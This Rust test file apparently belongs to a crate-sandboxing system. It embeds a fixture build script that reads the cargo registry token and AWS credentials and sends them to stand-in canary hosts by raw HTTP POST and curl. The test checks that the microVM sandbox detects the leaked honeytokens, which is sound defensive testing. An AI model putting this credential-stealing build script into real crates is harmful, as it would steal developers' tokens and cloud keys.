//! Canary: a crate that steals honeytokens must be caught.
//!
//! The fixture below is a tiny crate whose build script reads the cargo
//! registry token from the builder's home and POSTs it to a made up host
//! over plain HTTP, and has `curl` POST the AWS credentials over HTTPS.
//! Its source exists only as strings in this file: it is packed into a tar,
//! vendored into a payload image and compiled and run **only inside a
//! microVM**, never on the host (the rule in docs/TESTING.md). The test
//! passes if the fake internet saw the lookups and connections, terminated
//! the TLS connection, and the orchestrator found the job's own tokens in
//! what left the VM.
//!
//! Needs `/dev/kvm`, the guest images, subordinate IDs and a delegated
//! cgroup, so it runs on the server through `cargo xtask canary`.

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::indexing_slicing,
    clippy::panic,
    missing_docs
)]

use std::path::{Path, PathBuf};
use std::time::Duration;

use crateward_core::blobs::BlobStore;
use crateward_core::job::BuildOutcome;
use crateward_core::name::CrateName;
use crateward_orchestrator::backend::{FirecrackerBackend, FirecrackerConfig};
use crateward_orchestrator::cgroup::{CgroupTree, SlotLimits};
use crateward_orchestrator::firecracker::vm::{BootSpec, JobDrives};
use crateward_orchestrator::honeytokens::Honeytokens;
use crateward_orchestrator::payload::{Package, PayloadSpec};
use crateward_orchestrator::worker::{JobFiles, WorkerSetup, execute};

const NAME: &str = "canary-exfil";
const VERSION: &str = "0.1.0";
const HOST: &str = "exfil.crateward-canary.invalid";

const MANIFEST: &str = "[package]\nname = \"canary-exfil\"\nversion = \"0.1.0\"\nedition = \"2021\"\nbuild = \"build.rs\"\n";

/// Runs only in the microVM. Reads the token and sends it out.
const BUILD_RS: &str = r#"use std::io::{Read, Write};
fn main() {
    let home = std::env::var("HOME").unwrap_or_default();
    let mut token = String::new();
    if let Ok(mut file) = std::fs::File::open(format!("{home}/.cargo/credentials.toml")) {
        let _ = file.read_to_string(&mut token);
    }
    if let Ok(mut stream) = std::net::TcpStream::connect("exfil.crateward-canary.invalid:80") {
        let _ = write!(
            stream,
            "POST /collect HTTP/1.1\r\nHost: exfil.crateward-canary.invalid\r\nContent-Length: {}\r\n\r\n{}",
            token.len(),
            token
        );
        let mut reply = Vec::new();
        let _ = stream.read_to_end(&mut reply);
    }
    let _ = std::process::Command::new("curl")
        .args(["-s", "-m", "10", "-X", "POST", "--data-binary"])
        .arg(format!("@{home}/.aws/credentials"))
        .arg("https://tls.crateward-canary.invalid/collect")
        .status();
}
"#;

fn root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .ancestors()
        .nth(2)
        .map(Path::to_path_buf)
        .unwrap()
}

fn fixture_tar() -> Vec<u8> {
    let mut builder = tar::Builder::new(Vec::new());
    for (path, data) in [
        ("Cargo.toml", MANIFEST),
        ("build.rs", BUILD_RS),
        ("src/lib.rs", ""),
    ] {
        let mut header = tar::Header::new_gnu();
        header.set_size(data.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        builder
            .append_data(
                &mut header,
                format!("{NAME}-{VERSION}/{path}"),
                data.as_bytes(),
            )
            .unwrap();
    }
    builder.into_inner().unwrap()
}

fn lockfile(checksum: &str) -> String {
    format!(
        "version = 4\n\n\
         [[package]]\nname = \"{NAME}\"\nversion = \"{VERSION}\"\n\
         source = \"registry+https://github.com/rust-lang/crates.io-index\"\n\
         checksum = \"{checksum}\"\n\n\
         [[package]]\nname = \"crateward-probe\"\nversion = \"0.0.0\"\n\
         dependencies = [\n \"{NAME}\",\n]\n"
    )
}

#[tokio::test]
#[ignore = "run through `cargo xtask canary`"]
async fn a_build_script_that_steals_a_token_is_caught() {
    let work = root()
        .join("target/canary")
        .join(std::process::id().to_string());
    let _ = std::fs::remove_dir_all(&work);
    let slots_dir = work.join("slots");
    std::fs::create_dir_all(&slots_dir).unwrap();
    let out = root().join("target/guest/out");
    let kernel = std::fs::read_dir(&out)
        .unwrap()
        .filter_map(Result::ok)
        .map(|e| e.path())
        .find(|p| p.extension().is_some_and(|e| e == "bzImage"))
        .expect("run `cargo xtask guest-kernel` first");
    let fake_internet =
        root().join("target/x86_64-unknown-linux-musl/release/crateward_fake_internet");
    assert!(
        fake_internet.exists(),
        "build crateward_fake_internet for musl first"
    );
    let config = FirecrackerConfig {
        firecracker: root().join("target/guest/bin/firecracker"),
        launcher: PathBuf::from(env!("CARGO_BIN_EXE_crateward-vmjail")),
        slots_dir,
        slots: 1,
        uid_base: 160_020,
        gid_base: 160_020,
        limits: SlotLimits {
            cpus: 1,
            memory_mib: 2048 + 256,
            pids: 64,
        },
        max_file_size: 3 << 30,
        fake_internet: Some(fake_internet),
        authority: Some(root().join("target/guest/ca/authority.pem")),
    };
    for placeholder in ["placeholder-payload.img", "placeholder-scratch.img"] {
        std::fs::File::create(work.join(placeholder)).unwrap();
    }
    let boot = BootSpec {
        kernel,
        rootfs: out.join("rootfs.erofs"),
        boot_args: format!(
            "{} {}",
            BootSpec::default_boot_args("/usr/sbin/crateward-agent"),
            BootSpec::network_boot_args()
        ),
        vcpus: 1,
        memory_mib: 2048,
        drives: Some(JobDrives {
            payload: work.join("placeholder-payload.img"),
            scratch: work.join("placeholder-scratch.img"),
        }),
        network: true,
    };
    let snapshot = FirecrackerBackend::create_base_snapshot(&config, &boot, &work.join("snapshot"))
        .await
        .unwrap();
    let cgroups =
        CgroupTree::own().expect("run through `cargo xtask canary` for a delegated cgroup");
    let backend = FirecrackerBackend::new(config, cgroups, snapshot);

    let blobs = BlobStore::open(&work.join("cas")).unwrap();
    let tar = fixture_tar();
    let blob = blobs.put(&tar).unwrap();
    // Any 64 hex digits do: the lockfile and the vendored checksum file
    // only have to agree.
    let checksum = blob.blake3.clone();
    let spec = PayloadSpec {
        name: CrateName::parse(NAME).unwrap(),
        version: VERSION.parse().unwrap(),
        lockfile: lockfile(&checksum),
        packages: vec![Package {
            name: NAME.into(),
            version: VERSION.into(),
            checksum,
            blake3: blob.blake3,
        }],
    };
    let setup = WorkerSetup {
        exe: PathBuf::from(env!("CARGO_BIN_EXE_crateward_orchestrator")),
        work_dir: work.clone(),
        scratch_mib: 2048,
        check_timeout: Duration::from_secs(300),
    };
    let files = JobFiles {
        payload: work.join("job.payload"),
        scratch: work.join("job.scratch"),
        network: work.join("job.network"),
    };
    let tokens = Honeytokens::generate(&mut rand::rng(), 1000);
    let report = execute(&backend, 0, &setup, &blobs, 1, spec, &tokens, &files)
        .await
        .unwrap();
    eprintln!("{}", serde_json::to_string_pretty(&report).unwrap());
    assert_eq!(
        report.outcome,
        BuildOutcome::Succeeded,
        "{}",
        report.stderr_tail
    );
    assert!(report.network.dns.iter().any(|n| n == HOST));
    let found =
        |kind: &str, via: &str| report.leaked.iter().any(|l| l.kind == kind && l.via == via);
    assert!(
        found("cargo_registry_token", &format!("http://{HOST}")),
        "the token sent over HTTP was not found: {:?}",
        report.leaked
    );
    assert!(
        found("aws_access_key_id", "https://tls.crateward-canary.invalid"),
        "the key sent over HTTPS was not found: {:?}",
        report.leaked
    );
    std::fs::remove_dir_all(&work).unwrap();
}
